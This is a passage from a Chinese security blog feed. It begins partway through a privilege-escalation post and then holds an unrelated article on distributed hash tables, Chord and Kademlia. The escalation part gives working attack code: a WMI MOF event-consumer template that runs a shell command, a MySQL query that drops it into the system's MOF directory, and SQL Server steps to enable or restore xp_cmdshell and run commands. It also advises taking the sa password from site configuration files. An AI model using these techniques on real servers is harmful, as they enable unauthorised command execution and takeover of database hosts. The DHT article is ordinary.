class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(<span class="string">"\\.\\root\\subscription"</span>)</span><br><span class="line"></span><br><span class="line">instance of  * * EventFilter as &#123;</span><br><span class="line">    EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">    Name = <span class="string">"filtP2"</span>;</span><br><span class="line">    Query = <span class="string">"Select * From **InstanceModificationEvent "</span></span><br><span class="line">    <span class="string">"Where TargetInstance Isa \"</span></span><br><span class="line"><span class="string">    Win32_LocalTime\" "</span></span><br><span class="line">    <span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">    QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as &#123;</span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">    ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">    ScriptText =<span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\") WSH.run(\"此处填入cmd命令\")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding &#123;</span><br><span class="line">    Consumer = ;</span><br><span class="line">    <span class="built_in">Filter</span> = ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><p>保存为 xxx.mof<br>然后mysql执行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/xxx.mof'</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/windows/system32/wbem/mof/nullevt.mof'</span>;</span><br></pre></td></tr></table></figure><h2 id="Sqlserver篇"><a href="#Sqlserver篇" class="headerlink" title="Sqlserver篇"></a>Sqlserver篇</h2><hr><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><h4 id="提权前提-1"><a href="#提权前提-1" class="headerlink" title="提权前提"></a>提权前提</h4><ul><li><p>获取sa账号密码，例如查看网站的配置文件conn.asp,config.asp等。</p></li><li><p>需要开启xp_cmdshell才可执行系统命令  </p></li></ul><h4 id="提权过程-2"><a href="#提权过程-2" class="headerlink" title="提权过程"></a>提权过程</h4><ul><li><p>开启xp_cmdshell组件  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">', 1;RECONFIGURE;</span></span><br></pre></td></tr></table></figure><p><img src="/articles/权限提升姿势/20200411165707-6c32c566-7bd2-1.png" alt></p></li><li><p>如果xp_cmdshell组件被删除，上传xplog70.dll  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.sys.sp_addextendedproc ‘xp_cmdshell’, ‘C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll’</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>执行命令  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell 'cmd'</span><br></pre></td></tr></table></figure><p><img src="/articles/权限提升姿势/20200411165728-78b45ed0-7bd2-1.png" alt></p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><hr><p>这篇文章记录的提权方法都是较新或者比较经典，对实战有帮助的提权方法，其实还有很多其他的提权方法，碍于没有成功复现不好对提权的难度和利用条件做出判断，后续有机会也会慢慢都收录下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;某段时间突然对权限提升感起了兴趣，在各大论坛和大佬们的博客寻找权限提升的姿势，固有了想对提权姿势进行一次系统整理的打算，本篇文章是
      
    
    </summary>
    
      <category term="安全研究" scheme="http://ya2.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="mysql" scheme="http://ya2.top/tags/mysql/"/>
    
      <category term="提权" scheme="http://ya2.top/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="udf.dll" scheme="http://ya2.top/tags/udf-dll/"/>
    
      <category term="sqlserver" scheme="http://ya2.top/tags/sqlserver/"/>
    
      <category term="linux" scheme="http://ya2.top/tags/linux/"/>
    
      <category term="nullevt.mof" scheme="http://ya2.top/tags/nullevt-mof/"/>
    
      <category term="mof" scheme="http://ya2.top/tags/mof/"/>
    
      <category term="suid" scheme="http://ya2.top/tags/suid/"/>
    
  </entry>
  
  <entry>
    <title>分布式哈希表 (DHT) 和 P2P 技术</title>
    <link href="http://ya2.top/articles/%E5%88%86%E5%B8%83%E5%BC%8F%E5%93%88%E5%B8%8C%E8%A1%A8-DHT-%E5%92%8CP2P%E6%8A%80%E6%9C%AF/"/>
    <id>http://ya2.top/articles/分布式哈希表-DHT-和P2P技术/</id>
    <published>2020-04-17T16:01:01.000Z</published>
    <updated>2021-06-16T02:22:58.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h2><p>相信没有人没使用过 P2P 技术. BT 种子和磁力链接就是最常见的 P2P 技术, 使用 P2P 技术, 文件不再需要集中存储在一台服务器上, 而是分散再各个用户的节点上, 每个人都是服务的提供者, 也是服务的使用者. 这样的系统具有高可用性, 不会由于一两台机的宕机而导致整个服务不可用. 那么这样一个系统是怎样实现的, 如何做到<strong>去中心化(decentralization)</strong>和<strong>自我组织(self-organization)</strong>的呢? 这篇文章我们来讨论一下这个问题.</p><p>这篇文章先会介绍 P2P 网络的整体思路, 并引出 P2P 网络的主角 - <strong>分布式哈希表(Distributed Hash Table, DHT)</strong>; 接着会介绍两种分布式哈希表算法. 这些会让你对 P2P 技术有一个较为具体的了解.</p><h2 id="2-P2P-网络的概述"><a href="#2-P2P-网络的概述" class="headerlink" title="2. P2P 网络的概述"></a>2. P2P 网络的概述</h2><h3 id="2-1-传统-CS-网络和-P2P-网络"><a href="#2-1-传统-CS-网络和-P2P-网络" class="headerlink" title="2.1 传统 CS 网络和 P2P 网络"></a>2.1 传统 CS 网络和 P2P 网络</h3><p>CS 架构即 Client-Server 架构, 由服务器和客户端组成: 服务器为服务的提供者, 客户端为服务的使用者. 我们如今使用的很多应用程序例如网盘, 视频应用, 网购平台等都是 CS 架构. 它的架构如下图所示:</p><p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_1.png" alt="cs"></p><p>当然服务器通常不是一个单点, 往往是一个集群; 但本质上是一样的. CS 架构的问题在于, 一旦服务器关闭, 例如宕机, 被 DDoS 攻击或者被查水表, 客户端就无法使用了, 服务也就失效了.</p><p>为了解决这个问题, 人们提出了 <strong>P2P 网络(Peer-to-peer Networking)</strong>. 在 P2P 网络中, 不再由中心服务器提供服务, 不再有”服务器”的概念, 每个人即使服务的提供者也是服务的使用者 – i.e., 每个人都有可能是服务器. 我们常用的 BT 种子和磁力链接下载服务就是 P2P 架构. 人们对 P2P 系统作了如下定义:</p><blockquote><p><strong>a Peer-to-Peer system</strong> is a self-organizing system of equal, autonomous entities (peers) <strong>which</strong> aims for the shared usage of distributed resources in a networked environment avoiding central services.</p></blockquote><p>一个 P2P 系统是每个节点都是平等, 自主的一个自我组织的系统, 目的是在避免中心服务的网络环境中共享使用分布式资源.</p><p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_2.png" alt="P2P"></p><p>P2P 系统的架构如上图所示. 由于去掉了中心服务器, P2P 系统的稳定性就强很多: 少数几个个节点的失效几乎不会影响整个服务; 节点多为用户提供, 可以做到 “野火烧不尽, 春风吹又生”. 即使有人想恶意破坏, 也无法对整个系统造成有效打击.</p><h3 id="2-2-朴素的-P2P-网络"><a href="#2-2-朴素的-P2P-网络" class="headerlink" title="2.2 朴素的 P2P 网络"></a>2.2 朴素的 P2P 网络</h3><p>P2P 网络需要解决的一个最重要的问题就是, 如何知道用户请求的资源位于哪个节点上. 在第一代 P2P 网络中, 人们设置了一台中央服务器来管理资源所处的位置. 当一个用户想要发布资源, 他需要告诉中央服务器它发布的资源信息和自己的节点信息; 当其他用户请求资源的时候, 需要先请求中央服务器以获取资源发布者的节点信息, 再向资源发布者请求资源.</p><p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_3.png" alt="central-server"></p><p>这种 P2P 网络的好处是效率高, 只需要请求一次中央服务器就可以发布或获取资源. 然而它的缺点也很明显: 中央服务器是这个网络系统最脆弱的地方, 它需要存储所有资源的信息, 处理所有节点的请求; 一旦中央服务器失效, 整个网络就无法使用.</p><p>早期的另外一种 P2P 网络采取了不同的策略, 它不设置中央服务器; 当用户请求资源时, 它会请求它所有的邻接节点, 邻接节点再依次请求各自的邻接节点, 并使用一些策略防止重复请求, 直到找到拥有资源的节点. 也就是说, 这是一种泛洪搜索(Flooding Search).</p><p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_4.png" alt="flooding-search"></p><p>这种 P2P 网络去除了中央服务器, 它的稳定性就强多了. 然而它太慢了. 一次查找可能会产生大量的请求, 可能会有大量的节点卷入其中. 一旦整个系统中的的节点过多, 性能就会变得很差.</p><h3 id="2-3-分布式哈希表"><a href="#2-3-分布式哈希表" class="headerlink" title="2.3 分布式哈希表"></a>2.3 分布式哈希表</h3><p>为了解决这些问题, 分布式哈希表应运而生. 在一个有 $n$ 个节点的分布式哈希表中, 每个节点仅需存储 $\mathrm{O}(\log{n})$  个其他节点, 查找资源时仅需请求 $\mathrm{O}(\log{n})$ 个节点, 并且无需中央服务器, 是一个完全自组织的系统. 分布式哈希表有很多中实现算法, <a href="#3-Chord-算法">第 3 节</a>和<a href="#4-Kademlia-算法">第 4 节</a>会详细介绍其中的两种. 这里我们先来看看它们共通的思想.</p><p><strong>地址管理</strong></p><p>首先, 在分布式哈希表中, 每个节点和资源都有一个唯一标识, 通常是一个 160 位整数. 为方便起见, 我们称节点的唯一标识为 ID, 称资源的唯一标识为 Key. 我们可以把一个节点的 IP 地址用 SHA-1 算法哈希得到这个节点的 ID; 同样地, 把一个资源文件用 SHA-1 算法哈希就能得到这个资源的 Key 了.</p><p>定义好 ID 和 Key 之后, 就可以发布和存储资源了. 每个节点都会负责一段特定范围的 Key, 其规则取决于具体的算法. 例如, 在 Chord 算法中, 每个 Key 总是被第一个 ID 大于或等于它的节点负责. 在发布资源的的时候, 先通过哈希算法计算出资源文件的 Key, 然后联系负责这个 Key 的节点, 把资源存放在这个节点上. 当有人请求资源的时候, 就联系负责这个 Key 的节点, 把资源取回即可.</p><p>发布和请求资源有两种做法, 一种是直接把文件传输给负责的节点, 由它存储文件资源; 请求资源时再由这个节点将文件传输给请求者. 另一种做法是由发布者自己设法存储资源, 发布文件时把文件所在节点的地址传输给负责的节点, 负责的节点仅存储一个地址; 请求资源的时候会联系负责的节点获取资源文件的地址, 然后再取回资源. 这两种做法各有优劣. 前者的好处是资源的发布者不必在线, 请求者也能获取资源; 坏处是如果文件过大, 就会产生较大的传输和存储成本. 后者的好处是传输和存储成本都比较小, 但是资源的发布者, 或者说资源文件所在的节点必须一直在线.</p><p><strong>路由算法</strong></p><p>上面我们简述了地址系统, 以及如何发布和取回资源. 但是现在还有一个大问题: 如何找到负责某个特定 Key 的节点呢? 这里就要用到路由算法了. 不同的分布式哈希表实现有不同的路由算法, 但它们的思路是一致的.</p><p>首先每个节点会有若干个其他节点的联系方式(IP 地址, 端口), 称之为路由表. 一般来说一个有着 $n$ 个节点的分布式哈希表中, 一个节点的路由表的长度为 $\mathrm{O}(\log{n})$. 每个节点都会按照特定的规则构建路由表, 最终所有的节点会形成一张网络. 从一个节点发出的消息会根据特定的路由规则, 沿着网络逐步接近目标节点, 最终达到目标节点. 在有着 $n$ 个节点的分布式哈希表中, 这个过程的转发次数通常为 $\mathrm{O}(\log{n})$ 次.</p><p><strong>自我组织(self-organization)</strong></p><p>分布式哈希表中的节点都是由各个用户组成, 随时有用户加入, 离开或失效; 并且分布式哈希表没有中央服务器, 也就是说着这个系统完全没有管理者. 这意味着分配地址, 构建路由表, 节点加入, 节点离开, 排除失效节点等操作都要靠自我组织策略实现.</p><p>要发布或获取资源, 首先要有节点加入. 一个节点加入通常有以下几步. 首先, 一个新节点需要通过一些外部机制联系分布式哈希表中的任意一个已有节点; 接着新节点通过请求这个已有节点构造出自己的路由表, 并且更新其他需要与其建立连接的节点的路由表; 最后这个节点还需要取回它所负责的资源.</p><p>此外我们必须认为节点的失效是一件经常发生的事, 必须能够正确处理它们. 例如, 在路由的过程中遇到失效的节点, 会有能够替代它的其他节点来完成路由操作; 会定期地检查路由表中的节点是否有效; 将资源重复存储在多个节点上以对抗节点失效等. 另外分布式哈希表中的节点都是自愿加入的, 也可以自愿离开. 节点离开的处理与节点失效类似, 不过还可以做一些更多的操作, 比如说立即更新其他节点的路由表, 将自己的资源转储到其他节点等.</p><h2 id="3-Chord-算法"><a href="#3-Chord-算法" class="headerlink" title="3. Chord 算法"></a>3. Chord 算法</h2><p>上一节简单介绍了 P2P 网络和分布式哈希表, 现在我们来讨论它的一个具体实现. 分布式哈希表有很多中实现, Ion Stoica 和 Robert Morris 等人在 2001 年的一篇论文中提出了 <a href="https://dl.acm.org/doi/abs/10.1145/964723.383071" target="_blank" rel="noopener">Chord 算法</a>. Chord 算法比较简洁, 也很漂亮, 这里我们先介绍它.</p><h3 id="3-1-地址管理"><a href="#3-1-地址管理" class="headerlink" title="3.1 地址管理"></a>3.1 地址管理</h3><p>正如 <a href="#2-3-分布式哈希表">2.3</a> 节所述, Chord 使用一个 m 位整数作为节点和资源的唯一标识. 也就是说标识的取值范围为 $0$ 至 $2^m-1$ 的整数. Chord 把所有的 ID 排列成一个环, 从小到大顺时针排列, 首尾相连. 为了方便起见, 我们称每个 ID 都先于它逆时针方向的 ID, 后于它顺时针方向的 ID. 每个节点都能在这个环中找到自己的位置; 而对于 Key 值为 k 的资源来说, 它总是会被第一个 ID 先于或等于 k 的节点负责. 我们把负责 k 的节点称为 k 的后继, 记作 $successor(k)$. 例如, 如下图所示, 在一个 m = 4 的 Chord 环中, 有 ID 分别为 0, 1, 4, 8, 11, 14 的六个节点. Key 为 1 的资源被 ID 为 1 的节点负责, Key 为 5 的资源被 ID 为 8 的节点负责, Key 为 15 的资源被 ID 为 0 的节点负责. 也就是有 $successor(1)=1$, $successor(5)=8$, $successor(15)=0$.</p><p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_5.png" alt="chord-ring"></p><h3 id="3-2-路由算法"><a href="#3-2-路由算法" class="headerlink" title="3.2 路由算法"></a>3.2 路由算法</h3><p>在 Chord 算法中, 每个节点都保存一个长度为 m 的路由表, 存储至多 m 个其他节点的信息, 这些信息能让我们联系到这些节点. 假设一个节点的 ID 为 n(以下简称节点 n), 那么它的路由表中第 i 个节点应为第一个 ID 先于或等于 $n+2^{i-1}$ 的节点, 即 $successor(n+2^{i-1})$, 这里 $1 \leqslant i \leqslant m$. 我们把 n 的路由表中的第 i 个节点记作 $n.finger[i]$. 显然, 路由表中的第一个节点为顺时针方向紧挨着 n 的节点, 我们通常称它为节点 n 的后继节点, 记作 $n.successor$.</p><p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_6.png" alt="route-table"></p><p>有了这个路由表, 我们就可以快速地寻址了. 假设一个节点 n 需要寻找 Key 值为 k 的资源所在的节点, 即寻找 $successor(k)$, 它首先判断 k 是否落在区间 $(n, n.successor]$ 内; 如果是, 则说明这个 Key 由它的后继负责. 否则 n 从后向前遍历自己的路由表, 直到找到一个 ID 后于 k 的节点, 然后把 k 传递给这个节点由它执行上述查找工作, 直到找到为止.</p><p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_7.png" alt="route-table"></p><p>上图展示了从节点 4 寻找节点 1 的过程. 节点 4 的路由表中的节点分别为 8, 11, 14. 它首先会从后向前找到路由表中第一个后于 1 的节点为 14, 然后就请求 14 帮忙寻找 1. 节点 14 的路由表分别为 0, 4, 8; 同样地, 14 就会请求节点 0 帮忙寻找 1. 最终节点 0 找到它的后继即为节点 1.</p><p>可以看到, 整个查找过程是逐步逼近目标目标节点的. 离目标节点越远, 跳跃的距离就越长; 离目标节点越近, 跳跃的距离就越短, 越精确. 若整个系统有 N 个节点, 查找进行的跳跃次数就为 $\mathrm{O}(\log N)$.</p><h3 id="3-3-自我组织"><a href="#3-3-自我组织" class="headerlink" title="3.3 自我组织"></a>3.3 自我组织</h3><p><strong>节点加入</strong></p><p>一个节点要想加入 Chord 并不难. 上一节说了, Chord 系统中的任意一个节点都能对任意 Key k 找到它的后继 $successor(k)$. 首先, 新节点 $n$ 使用一些算法生成自己的 ID, 然后它需要联系系统中的任意一个节点 $n’$, 让他帮忙寻找 $successor(n)$. 显然, $successor(n)$ 即是 n 的后继节点, 同时也是它路由表中的第一个节点. 接下来它再请求 $n’$ 帮忙分别寻找 $successor(n + 2^1)$, $successor(n + 2^2)$, 等等, 直到构建完自己的路由表.</p><p>构建完自己的路由表后, n 基本上算是加入 Chord 了. 不过还不够, 因为这时其他的节点还不知晓它的存在. n 加入后, 有些节点的路由表中本该指向 n 的指针却仍指向 n 的后继. 这个时候就需要提醒这些节点更新路由表. 哪些节点需要更新路由表呢? 我们只需把操作反过来: 对所有的 $1 \leqslant i \leqslant m$, 找到第一个<u>后于</u> $n - 2^{i-1}$ 的节点. 这与寻找后继相同, 就不再赘述了.</p><p>最后, 新节点 n 还需要取回它负责的所有资源. n 只需联系它的后继取回它后继所拥有的所有 Key 后于或等于 n 的资源即可.</p><p><strong>处理并发问题</strong></p><p>考虑多个节点同时加入 Chord. 如果使用上述方法, 就有可能导致路由表不准确. 为此, 我们不能在新节点加入的时候一次性更新所有节点的路由表. Chord 算法非常重要的一点就是保证每个节点的后继节点都是准确的. 为了保证这一点, 我们希望每个节点都能和它的后继节点双向通信, 彼此检查. 因此我们给每个节点添加一个属性 $n.predecessor$ 指向它的前序节点. 然后, 我们让每个节点定期执行一个操作, 称之为 $stabilize$. 在 $stabilize$ 操作中, 每个节点 $n$ 都会向自己的后继节点 $s$ 请求获取 $s$ 的前序节点 $x$. 然后 $n$ 会检查 $x$ 是否更适合当它的后继, 如果是, $n$ 就它自己的后继更新为 $x$. 同时 $n$ 告诉自己的后继 $s$ 自己的存在, $s$ 又会检查 $n$ 是否更适合当它的前序, 如果是, $s$ 就把自己的前序更新为 $n$. 这个操作足够简单, 又能够保证 Chord 环的准确性.</p><p>当新节点 $n$ 加入 Chord 时, 首先联系已有节点 $n’$ 获取到 $n.successor$. $n$ 除了设置好自己的后继之外, 什么都不会做; 此时 $n$ 还没有加入 Chord 环. 这要等到 $stabilize$ 执行之后: 当 $n$ 执行 $stabilize$ 时, 会通知它的后继更新前序为 $n$; 当 $n$ 真正的前序 $p$ 执行 $stabilize$ 时会把自己的后继修正为 $n$, 并通知 $n$ 设置前序为 $p$. 这样 $n$ 就加入到 Chord 环中了. 这样的操作在多个节点同时加入时也是正确有效的.</p><p>此外每个节点 $n$ 还会定期修复自己的路由表, 以确保能指向正确的节点. 具体的做法是随机选取路由表中的第 $i$ 个节点, 查找并更新 $n.finger[i]$ 为 $successor(n+2^{i-1})$. 由于 $n$ 的后继节点始终是正确的, 所以这个查找操作始终是有效的.</p><p><strong>节点失效与离开</strong></p><p>一旦有节点失效, 势必会造成某个节点的后继节点失效. 而后继节点的准确性对 Chord 来说至关重要, 它的失效意味着 Chord 环断裂, 可能导致查找失效, $stabilize$ 操作无法进行. 为了解决这个问题, 一个节点通常会维护多个后继节点, 形成一个后继列表, 它的长度通常是 m. 这样的话, 当一个节点的后继节点失效后, 它会在后继列表中寻找下一个替代的节点. 此外一个节点的失效意味着这个节点上资源的丢失, 因此一个资源除了存储在负责它的节点 n 上之外, 还会被重复地存储在 n 的若干个后继节点上.</p><p>节点离开的处理与节点失效相似, 不同的是节点离开时可以做一些额外的操作, 例如通知它周围的节点立即执行 $stabilize$ 操作, 把资源转移到它的后继, 等等.</p><h2 id="4-Kademlia-算法"><a href="#4-Kademlia-算法" class="headerlink" title="4. Kademlia 算法"></a>4. Kademlia 算法</h2><p>Petar Maymounkov 和 David Mazières 在 2002 年的一篇论文中提出了 <a href="https://link.springer.com/chapter/10.1007/3-540-45748-8_5" target="_blank" rel="noopener">Kademlia 算法</a>,相比与 Chord 算法, Kademlia 算法容错度更高, 效率也高于 Chord, 也更巧妙合理.</p><h3 id="4-1-地址管理"><a href="#4-1-地址管理" class="headerlink" title="4.1 地址管理"></a>4.1 地址管理</h3><p>Kademlia 同样使用 m 位整数作为节点和资源的唯一标识. 与 Chord 中的 “区间负责制” 不同, Kademlia 中的资源都是被离它最近的节点负责. 出于容错考虑, 每个资源通常都被距离它最近的 k 个节点负责, 这里 k 是一个常量, 通常取 k 使得在系统中任意 k 个节点都不太可能在一小时之内同时失效, 比如取 k = 20. 有趣的是, 这里的 “距离” 并不是数值之差, 而是通过异或运算得出的. 在 Kademlia 中, 每个节点都可以看作一颗高度为 m + 1 的二叉树上的叶子节点. 把 ID 二进制展开, 从最高位开始, 自根节点逢 1 向左逢 0 向右, 直到抵达叶子节点. 如下图所示.</p><p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_8.png" alt="binary-tree"></p><p>Kademlia 的巧妙之处就是定义两个 ID $x$ 和 $y$ 之间的距离为 $x \oplus y$. 异或运算的特点是异为真同为假, 如果两个 ID 高位相异低位相同, 它们异或的结果就大; 如果它们高位相同低位相异, 异或的结果就小. 这与二叉树中叶子的位置分布是一致的: 如果两个节点共有的祖先节点少(高位相异), 它们的距离就远; 反之, 如果共有的祖先节点多(高位相同), 它们的距离就近. 上图标注了一些节点之间的距离, 大家可以感受一下.</p><p>异或运算的另一个重要性质是, 异或的逆运算仍是异或. 即如果有 $x \oplus y = d$ 则 $x \oplus d = y$. 这就意味着对于每个节点, 给的一个距离 $d$, 至多有一个与其距离为 $d$ 节点. 这样一来 Kademlia 的拓扑结构是<strong>单向的(unidirectional)</strong>. 单向性确保不管查找从哪个节点开始, 同一 Key 的所有查找都会沿着同一路径收敛.</p><h3 id="4-2-路由算法"><a href="#4-2-路由算法" class="headerlink" title="4.2 路由算法"></a>4.2 路由算法</h3><p>对于任意一个给定节点, 我们将二叉树从根节点开始不断向下分成一系列不包含该节点的子树. 最高的子树由不包含该节点的二叉树的一半组成, 下一个子树又由不包含该节点的剩余树的一半组成, 以此类推. 如果这个二叉树的高度为 m + 1, 我们最终会得到 m 个子树. 接着在每个子树中任取 k 个节点, 形成 m 个 <strong>k 桶(k-bucket)</strong>, 这 m 个 k 桶就是 Kademlia 节点的路由表. 我们定义最小子树中取得的节点为第 0 个 k 桶, 次小的子树中取得的节点为第 1 个 k 桶, 以此类推. 不难看出, 对于每个 $0 \leqslant i &lt; m$, 第 $i$ 个 k 桶中节点与当前节点的距离总是在区间 $[2^i, 2^{i+1})$ 之内. 下图展示了 m = 3, k = 2 时节点 101 的 k 桶.</p><p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_9.png" alt="k-bucket"></p><p>Kademlia 中每个节点都有一个基础操作, 称为 <code>FIND_NODE</code> 操作. <code>FIND_NODE</code> 接受一个 Key 作为参数, 返回当前节点所知道的 k 个距离这个 Key 最近的节点. 基于 k 桶, 找到这 k 个最近的节点很容易: 先求出这个 Key 与当前节点的的距离 $d$; 上面说了, 第 $i$ 个 k 桶中节点与当前节点的距离总是在区间 $[2^i, 2^{i+1})$ 之内, 这些区间都不会互相重叠, 那么显然 $d$ 落在的区间所属的 k 桶中的节点就是距离这个 Key 最近的节点. 如果这个 k 桶中的节点不足 k 个, 则在后一个 k 桶中取节点补充, 如果还不够就再在后一个 k 桶中取. 如果这个节点所有的 k 桶中的节点数之和都不足 k 个, 就返回它所知道的所有节点.</p><p>有了 <code>FIND_NODE</code> 操作, 我们就可以定义 Kademlia 中最重要的一个过程, <strong>节点查找(node lookup)</strong>. 节点查找要做的是, 给定一个 Key, 找出整个系统中距离它最近的 k 个节点. 这是一个递归过程: 首先初始节点调用自己的 <code>FIND_NODE</code>, 找到 k 个它所知的距离 Key 最近的节点. 接下来我们在这 k 个节点中取 $\alpha$ 个最近的节点, 同时请求它们为 Key 执行 <code>FIND_NODE</code>. 这里的 $\alpha$ 也是一个常量, 作用是同时请求提高效率, 比如取 $\alpha = 3$.</p><p>在接下来的递归过程中, 初始节点每次都在上一次请求后返回的节点中取 $\alpha$ 个最近的, 并且未被请求过的节点, 然后请求它们为 Key 执行 <code>FIND_NODE</code>, 以此类推. 每执行一次, 返回的节点就距离目标近一点. 如果某次请求返回的节点不比上次请求返回的节点距目标 Key 近, 就向所有未请求过的节点请求执行 <code>FIND_NODE</code>. 如果还不能获取更近的节点, 过程就终止. 这时我们在其中取 k 个距离 Key 最近的节点, 就是节点查找的结果.</p><p>Kademlia 的大多数操作都基于节点查找. 发布资源时, 只需为资源的 Key 执行节点查找, 获取 k 个距离资源最近的节点, 把资源存储在这些节点上.</p><p>获取资源也类似, 也只需为目标资源的 Key 执行节点查找, 不同的是一旦遇到拥有目标资源的节点就停止查找. 此外, 一旦一个节点查找成功, 它就会把资源缓存在离自己最近的节点上. 因为 Kademlia 的拓扑结构是单向的, 其他离目标资源比自己远的节点在查找时就很可能会经由缓存的节点, 这样就能提前终止查找, 提高了查找效率.</p><h3 id="4-3-自我组织"><a href="#4-3-自我组织" class="headerlink" title="4.3 自我组织"></a>4.3 自我组织</h3><p><strong>k 桶的维护</strong></p><p>所有的 k 桶都遵循<strong>最近最少使用(Least Recently Used, LRU)</strong>淘汰法. 最近最少活跃的节点排在 k 桶的头部, 最近最多活跃的节点排在 k 桶尾部. 当一个 Kademlia 节点接收到任何来自其他节点的消息(请求或响应)的时候, 都会尝试更新相应的 k 桶. 如果这个节点在接收者对应的 k 桶中, 接收者就会把它移动到 k 桶的尾部. 如果这个节点不在相应的 k 桶中, 并且 k 桶的节点小于 k 个, 那么接收者就会直接把这个节点插入到这个 k 桶的尾部. 如果相应的 k 桶是满的, 接收者就会尝试 ping 这个 k 桶中最近最少活跃的节点. 如果最近最少活跃的节点失效了, 那么就移除它并且将新节点插入到 k 桶的尾部; 否则就把最近最少活跃的节点移动到 k 桶尾部, 并丢弃新节点.</p><p>通过这个机制就能在的通信的同时刷新 k 桶. 为了防止某些范围的 Key 不易被查找的情况, 每个节点都会手动刷新在上一小时未执行查找的 k 桶. 做法是在这个 k 桶中随机选一个 Key 执行节点查找.</p><p><strong>节点加入</strong></p><p>一个新节点 $n$ 要想加入 Kademlia, 它首先使用一些算法生成自己的 ID, 然后它需要通过一些外部手段获取到系统中的任意一个节点 $n’$, 把 $n’$ 加入到合适的 k 桶中. 然后对自己的 ID 执行一次节点查找. 根据上述的 k 桶维护机制, 在查找的过程中新节点 $n$ 就能自动构建好自己的 k 桶, 同时把自己插入到其他合适节点的 k 桶中, 而无需其他操作.</p><p>节点加入时除了构建 k 桶之外, 还应该取回这个节点应负责的资源. Kademlia 的做法是每隔一段时间(例如一个小时), 所有的节点都对其拥有的资源执行一次发布操作; 此外每隔一段时间(例如24小时)节点就会丢弃这段时间内未收到发布消息的资源. 这样新节点就能收到自己须负责的资源, 同时资源总能保持被 k 个距离它最近的节点负责.</p><p>如果每个小时所有节点都重发它们所拥有的资源, 就有些浪费了. 为了优化这一点, 当一个节点收到一个资源的发布消息, 它就不会在下一个小时重发它. 因为当一个节点收到一个资源的发布消息, 它就可以认为有 k - 1 个其他节点也收到了这个资源的发布消息. 只要节点重发资源的节奏不一致, 这就能保证每个资源都始终只有一个节点在重发.</p><p><strong>节点失效和离开</strong></p><p>有了上述 k 桶维护和资源重发机制, 我们不需要为节点的失效和离开做任何其它的工作. 这也是 Kademlia 算法的巧妙之处, 它的容错性要高于其他分布式哈希表算法.</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>这篇文章介绍了 P2P 技术和分布式哈希表, 以及两种分布式哈希表算法, 基本介绍了它们的原理和实现机制. 文本也是笔者对这两篇论文学习的总结, 限于篇幅和笔者的精力, 对于其中的一些实现细节, 策略背后的理论和实验支撑, 算法的证明等未予阐述. 建议想要深入学习的同学阅读参考资料中的内容. 搭建 P2P 架构是一项很有挑战性的工作, 笔者认为即使不从事 P2P 开发, 了解和学习 P2P 技术对于服务器架构方面也是很有帮助的.</p><hr><p><strong>参考资料</strong></p><ul><li><a href="https://www.springer.com/us/book/9783540291923" target="_blank" rel="noopener">Peer-to-Peer Systems and Applications</a></li><li><a href="https://dl.acm.org/doi/abs/10.1145/964723.383071" target="_blank" rel="noopener">Chord: A scalable peer-to-peer lookup service for internet applications</a></li><li><a href="https://link.springer.com/chapter/10.1007/3-540-45748-8_5" target="_blank" rel="noopener">Kademlia: A Peer-to-Peer Information System Based on the XOR Metric</a></li></ul><style>.posts-expand .post-body img{margin:0 auto; 